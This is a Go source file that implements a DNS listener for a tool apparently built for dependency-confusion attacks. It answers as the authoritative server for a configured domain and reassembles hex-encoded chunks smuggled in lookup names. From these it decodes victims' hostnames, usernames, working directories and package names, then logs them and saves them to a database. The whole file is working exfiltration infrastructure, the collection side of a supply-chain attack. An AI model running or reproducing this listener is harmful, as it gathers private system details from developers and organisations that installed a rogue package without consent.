package dns_exfiltrate

import (
	"database/sql"
	"dependency-confusion/internal/database"
	"dependency-confusion/internal/models"
	"dependency-confusion/runconfig"
	"encoding/hex"
	"encoding/json"
	"net"
	"sort"
	"strconv"
	"strings"
	"time"
	log "github.com/sirupsen/logrus"
	"github.com/miekg/dns"
)

type DNS struct {
	SqlDB				*sql.DB
	Config 				*runconfig.DNSConfig
	cache 				map[string]map[int]string
	cacheLastReceived 	map[string]int
}


func New(sql *sql.DB, config *runconfig.DNSConfig) *DNS {
	cache := make(map[string]map[int]string)
	cacheLastReceived := make(map[string]int)
	return &DNS{sql, config, cache, cacheLastReceived}
}


func parseDNSData(data map[int]string) string {
    keys := make([]int, len(data))
    i := 0
    for k := range data {
        keys[i] = k
        i++
    }
    sort.Ints(keys)
    var hex string
    for _, k := range keys {
        hex += data[k]
    }
    return hex
} 

var answersMap map[string]string


func (d *DNS) handleInteraction(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(r)
	remoteAddr := w.RemoteAddr().String()
	q1 := r.Question[0]
	t := time.Now()

	if dns.IsSubDomain(d.Config.Domain+".", q1.Name) && q1.Name != "ns1."+d.Config.Domain+"." && q1.Name != "ns2."+d.Config.Domain+"." && dns.TypeToString[q1.Qtype] == "A" {
		addrParts := strings.Split(remoteAddr, ":")
		dateString := "Received at: " + "`" + t.Format("January 2, 2006 3:04 PM") + "`"
		fromString := "Received From: " + "`" + addrParts[0] + "`"
		nameString := "Lookup Query: " + "`" + q1.Name + "`"
		typeString := "Query Type: " + "`" + dns.TypeToString[q1.Qtype] + "`"

		message := "*Received DNS interaction:*" + "\n\n" + dateString + "\n" + fromString + "\n" + nameString + "\n" + typeString
		
		log.Infoln(message)

		queryStr := strings.TrimRight(q1.Name, ".")
		valArray := strings.Split(queryStr, ".")
        if valArray[0] == "v2_f" && valArray[4] == "v2_e" {
            idx := valArray[1]
            srvRand := valArray[2]
            data := valArray[3]
            idxInt, _ := strconv.Atoi(idx)
            if d.cache[srvRand] == nil {
                d.cache[srvRand] = make(map[int]string)
            }
            d.cache[srvRand][idxInt] = data
            if len(data) < 60 {
                d.cacheLastReceived[srvRand] = idxInt + 1
            } else {
                // len == 60 but it is end of json string
                if bs, _ := hex.DecodeString(data); bs[len(bs)-1] == '}' {
                    d.cacheLastReceived[srvRand] = idxInt + 1
                } 
            }
            // go to decode
            if len(d.cache[srvRand]) == d.cacheLastReceived[srvRand] {
                hexStr := parseDNSData(d.cache[srvRand])
                bs, err := hex.DecodeString(hexStr)
                if err != nil {
                    log.Errorln(err)
                }
				var dataExfiltrated models.DataExfiltrated
                err = json.Unmarshal(bs, &dataExfiltrated)
                if err != nil {
                    log.Errorln(err)
                }
                
				log.Infof("Source IP: %s; Hostname: %s; Username: %s; CWD: %s; Package: %s\n", addrParts[0], dataExfiltrated.Hostname, dataExfiltrated.Username, dataExfiltrated.CWD, dataExfiltrated.Package)
				
				database.AddData(d.SqlDB, addrParts[0], &dataExfiltrated)
			}
        }
	}
	switch r.Question[0].Qtype {
	case dns.TypeA:
		msg.Authoritative = true
		domain := msg.Question[0].Name
		address, ok := answersMap[domain]
		if ok {
			msg.Answer = append(msg.Answer, &dns.A{
				Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 1},
				A:   net.ParseIP(address),
			})
		}
	}
	w.WriteMsg(&msg)
}



func RunDNS(sql *sql.DB, config *runconfig.DNSConfig) {

	d := New(sql, config)
	answersMap = map[string]string{
		d.Config.Domain + ".":          d.Config.PublicIP,
		"ns1." + d.Config.Domain + ".": d.Config.PublicIP,
		"ns2." + d.Config.Domain + ".": d.Config.PublicIP,
	}

	for _, record := range d.Config.Records {
		answersMap[record.Hostname+"."] = record.IP
	}
	if d.Config.Domain == "" || d.Config.PublicIP == "" {
		log.Errorln("Error: Must supply a domain and public IP in config file")
		return
	} else {
		log.Infoln("Listener starting!")
	}

	dns.HandleFunc(".", d.handleInteraction)
	if err := dns.ListenAndServe(d.Config.PublicIP+":53", "udp", nil); err != nil {
		log.Errorln(err.Error())
		return
	}
}
